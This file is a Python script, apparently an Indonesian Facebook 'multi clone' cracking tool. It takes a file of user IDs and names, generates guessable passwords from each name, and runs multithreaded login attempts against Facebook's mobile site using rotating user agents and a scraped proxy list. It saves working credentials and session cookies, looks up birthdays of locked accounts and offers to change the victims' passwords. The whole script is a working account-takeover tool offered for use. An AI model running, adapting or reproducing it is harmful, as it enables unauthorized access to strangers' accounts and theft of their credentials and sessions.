# code by Strovmirviaska #
#Cracking File Methode#
#Silahkan Oprek Bagian Ua#

import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%s %s %s'%(ha,op,ta)
waktu.split('/')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
Apk = []
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"
aaaa, bbbb, cccc = "tools", "debug", "accesstoken"
bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"

########## USER AGENT #########
ugen2=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
ugen=['Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36']
##############################
keparat=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for x in range(999):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	TEMAN = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; GT-{str(rc(aZ))}{str(rr(199,999))}{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(29,109))}.0.{str(rr(1999,5999))}.{str(rr(85,190))} Mobile Safari/537.36"
	FUCK = f"{TEMAN}"
	if FUCK in keparat:pass
	else:keparat.append(FUCK)

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
     
#-------- LOADING ANIMASI ------------
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
# LOGO

def logo():
    os.system("clear")
    print("""\33[31m
$$\      $$\  $$$$$$\  $$$$$$$$\ 
$$$\    $$$ |$$  __$$\ $$  _____|
$$$$\  $$$$ |$$ /  \__|$$ |      
$$\$$\$$ $$ |$$ |      $$$$$\    
$$ \$$$  $$ |$$ |      $$  __|   
$$ |\$  /$$ |$$ |  $$\ $$ |      
$$ | \_/ $$ |\$$$$$$  |$$ |      
\__|     \__| \______/ \__|      
\033[32m⛧ 𝙈𝙐𝙇𝙏𝙄 𝘾𝙇𝙊𝙉𝙀 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 ⛧   \033[0;93m
_________________________________________
  
  Developer : Strovmirviaska 
  Github    : Strv-BOT
  Facebook  : Facebook.com/Tddyboy11
  Contact   : Strovmirviaska11@gmail.com
_________________________________________\033[1;37m""")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Strovmirviaska Compleated...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(H,H,H,H,str(len(ok)),H))
        print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(H,H,H,str(len(cp)),H))
        cek_cp = input(f"{H}══════════════════════════════════════════\n [{H}+{H}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] Don't be empty");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" {N}[{M}!{N}] Play airplanemode first");time.sleep(5)
            ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}Alok123{N}")
                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                #print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[STRV-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[STRV-CP] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                    print("")
            print("")
            jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
            jalan(' %s[%s✓%s] Retrun SC type "%spython UserCrack.py%s"'%(N,H,N,H,N));exit()
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}Strvmeta1.py{N}'");exit()
        else:
            print(f"\n {N}[{M}!{N}] Choose Y/t");hasil(ok,cp)
    else:
        jalan('\n\n %s[%s!%s] Sorry you didnt get results'%(N,M,N));exit()


def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
### MENU UTAMA ###
def file():
            os.system("clear")
            logo()    
            print("\033[1;92m [1] Crack File ")
            print ("\033[1;92m [2] Cek Result")
            print("\033[1;92m [3] Scrip Info")
            key = input(" [+] Input : ")
            if key in [""]:
                print(" [!] please select correct option")
                exit()
            elif key in ["1", "01"]:
                __chigoue__().chi(id)
            elif key in ["2","02"]:
                result()
            elif key in ["3","03"]:
                infoauthor()

# MULAI CRACK
class __chigoue__:
    def __init__(self):
        self.id = []
    def chi(self, id):
        os.system("clear")
        logo()
        crot = input(f" {H}[{H}+{H}] Want to show related apps [{H}y{H}/{H}t{H}]: ")
        if crot in[""]:
            print(f" {N}[{M}×{N}] Don't be empty");__chigoue__().chi(id)
        elif crot in["Y","y"]:
            Apk.append("y")
        elif crot in["T","t"]:
            Apk.append("t")
        else:
            print(f" {H}[{H}×{H}] Select Between y/t");__chigoue__().chi(id)
        self.cnt = input(' \033[1;92m[+] Enter File Name :\033[1;92m ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        ___two___ = ('y')
        if ___two___ in ('yes', 'Yes', 'Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One')
            self.chi(id)

# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[STRV]","\x1b[1;92m[STRV]","\x1b[1;92m[STRV]","\x1b[1;92m[STRV]","\x1b[1;92m[STRV]","\x1b[1;92m[STRV]","\x1b[1;92m[STRV]"])
        sys.stdout.write(f"\r [FB] {loop} | OK/CP {ok}/{cp} |")
        sys.stdout.flush()   
        try:os.mkdir('results')
        except:pass
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                #ua = random.choice(keparat)
                ua2 = random.choice(ugen)
                session.headers.update({"Host":"m.facebook.com","cache-control": "max-age=0","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer":"https://m.facebook.com/","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
                p = session.get('https://m.facebook.com/login.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F')
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"}
                heade={
						'Host':'m.facebook.com',
						'content-length': str(random.randint(100, 300)),
						'cache-control': 'max-age=0',
						'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
						'sec-ch-ua-mobile': '?1',
						'sec-ch-ua-platform': '"Android"',
						'upgrade-insecure-requests': '1',
						'origin': 'https://m.facebook.com',
						'content-type': 'application/x-www-form-urlencoded',
						'user-agent': ua2,
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
						'sec-fetch-site': 'same-origin',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-user': '?1',
						'sec-fetch-dest': 'document', 
						'referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
					}
                po = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        print('\r %s[STRV-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}\n')
                    elif "y" in Apk:
                        print(f'\r %s[STRV-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}')
                    wrt = '[STRV-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r %s[STRV-CP] %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                        wrt = '[STRV-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r %s[STRV-CP] %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
                    wrt = '[STRV-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
             self.__metode__(cebok, user, pasw)
             

    def __pler__(self):
        os.system('clear')
        logo()
        print (' Methode 3 in 1 ')
        print (f'{N}[1] {M}FREE FACEBOOK')
        print (f'{N}[2] {M}MBASIC FACEBOOK')
        print (f'{N}[3] {M}MOBILE FACEBOOK')
        yan = input(f'{N}[+] {K}Select Method : ')
        if yan == '':
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            xx = "free.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('2', '02'):
            xx = "mbasic.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('3', '03'):
            xx = "m.facebook.com"
            self.kombinasi_pw(xx)
        else:
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()

    def kombinasi_pw(self,url):
        print('%s═══════════════════════════════════\n %sSetting Password Menu%s'%(H,H,H))
        print('%s[%s1%s] Otomatis Password'%(H,H,H))
        print('%s[%s2%s] Manual Password'%(H,H,H))
        pw = input(f"{H}[{H}+{H}] Select Password Method : ")
        if pw in[""]:
            print(f" {N}[{M}!{N}] Don't be empty");self.kombinasi_pw(url)
        elif pw in["1","01"]:
            print('%s═══════════════════════════════════\n[%s+%s] OK : results/OK-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            print('%s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            print('%s═══════════════════════════════════\n[%s!%s] Use Airplane Mode If You No Result\n[%s!%s] Every 500 Id After Use Airplane Mode\n[%s!%s] To stop %sCTRL+c%s on keyboard\n═══════════════════════════════════'%(H,H,H,H,H,H,H,H,H))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[0]+"321", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       else:
                           pwx = [name, xz[0]+"123", xz[0]+"321", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        elif pw in["2","02"]:
            print('Berikan Koma Di Setiap Password ')
            print('Contoh : sayang,rahasia,bismillah')
            pw = input(f"{N}[{K}?{N}] Enter additional password : {H}").split(",")         
            print('%s═══════════════════════════════════\n[%s+%s] OK : results/OK-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            print('%s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            print('%s════════════════════════════════════\n[%s!%s] Use Airplane Mode If You Result\n[%s!%s] After 500 Id Crack Use Airplane Mode\n[%s!%s] To stop %sCTRL+c%s on keyboard\n═══════════════════════════════════════'%(H,H,H,H,H,H,H,H,H))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx = pw
                       else:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx =  pw
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
            
def result():
	os.system("clear")
	logo()
	print(f'[1]. Hasil OK Anda ')
	print(f'[2]. Hasil CP Anda ')
	print('[3]. Kembali	')
	kz = input(f'[?] Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s]. %s %s ID )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]')
			geeh = input('\n Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'[ Klik Enter ]')
			file()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(2)
			file()
		if len(vin)==0:
			print(' Tidak Mempunyai File OK ')
			time.sleep(2)
			file()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s]. %s %s ID )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s]. %s %s ID )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener Kontol ')
				time.sleep(2)
				result()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'[Klik Enter]')
			file()
	elif kz in ['3']:
		file()
	else:
		print(' Pilih Yang Bener Kontol ')
		file()

user = "teddy"
pwas ="ganteng"
def alok():
    try:
        open(".ini_pw.txt", "r").read()
    except FileNotFoundError:
        os.system("clear")
        logo()
        print('\n %s%sMenu Tools%s'%(BM,P,N))
        print(' [%s1%s] Login Ke Tools'%(H,N))
        print(' [%s2%s] Hubungi Admin'%(H,N))
        pil = input(' %s[%s?%s] Choice : '%(N,K,N))
        if pil =="":
            jalan(f" {N}[{M}×{N}] Sorry, it is wrong...!");time.sleep(1);alok()
        elif pil in["2","02"]:
            jalan("\n %s[%s•%s] %sYou will be redirected to the Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/6282290885204?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);alok()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
            print(' %s[%s!%s] Masukan %sUsername & Password%s Untuk Masuk ke tools!'%(N,M,N,H,N))
        else:
            exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
        pw = input(" %s[%s?%s] Enter Username : %s"%(N,K,N,H))
        loading()
        if pw in [""]:
            jalan(" %s[%s!%s] Sorry don't be blank!"%(N,M,N));time.sleep(1);alok()
        elif pw in user:
            jalan(" %s[%s✓%s] OK Username is correct"%(N,H,N));time.sleep(1);kska()
        else:
            jalan(" %s[%s!%s] Sorry, wrong username"%(N,M,N));time.sleep(1);alok()
    file()
def kska():
    xx = input(" %s[%s?%s] Enter Password : %s"%(N,K,N,H))
    loading()
    if xx in[""]:
        jalan(" %s[%s!%s] Sorry don't be blank!"%(N,M,N));time.sleep(1);alok()
    elif xx in pwas:
        jalan(" %s[%s✓%s] OK Password is correct"%(N,H,N));time.sleep(2);open(".ini_pw.txt", "a").write(xx);file()
    else:
        jalan(" %s[%s!%s] Sorry, wrong Password"%(N,M,N));time.sleep(1);alok()
        
def infoauthor():
        os.system("clear")
        logo()
        jalan(f" {BM}{P}SC INFO{N}\n [{H}•{N}] Author SC : {K}Strovmirviaska\n {N}[{H}•{N}] Whatsapp : {K}+6282290885204\n {N}[{H}•{N}] Github : {K}https://github.com/Strv-BOT\n {N}[{H}•{N}] Status SC : Gratis Rasa {H}Premium{N}\n {N}[{H}•{N}] WARNING : DILARANG MEMPERJUAL BELIKAN USERNAME & PASSWORD SC Metavers.{N}\n\n {BM}FIX BUG{N}\n [{H}✓{N}] Terjadinya Error saat memainkan mode pesawat saat proses crack sedang berjalan, kini sudah diperbaiki dan sudah bisa dimainkan mode pesawat saat proses crack sedang berjalan\n [{H}✓{N}] Sedikit perubahan warna text dan tampilan SC\n [{H}✓{N}] Perubahan user agent bawaan SC\n [{H}✓{N}] Pengoptimalan Setinggan Password Manual Dan Random\n [{H}✓{N}] Penambahan menampilkan {H}Web & Aplikasi AKTIF{N}")
        upd = input('\n %s[%s?%s] Send direct message to Author [%sY%s/%st%s] : '%(N,K,N,H,N,M,N))
        if upd =="":
            exit(f"{N}[{M}×{N}] Sorry, it is wrong")
        elif upd in["Y","y"]:
            jalan("\n %s[%s•%s] %sYou will be redirected to the Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/6282290885204?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);file()
        elif upd in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] Ok, thank you...")
            jalan(' %s[%s✓%s] Silahkam Gunakan"%sTools Scrip Ini !%s"'%(N,H,N,H,N));file()
        else:
            exit(f"{N}[{M}×{N}] Sorry, it is wrong")   
          
if __name__ == '__main__':
    alok()
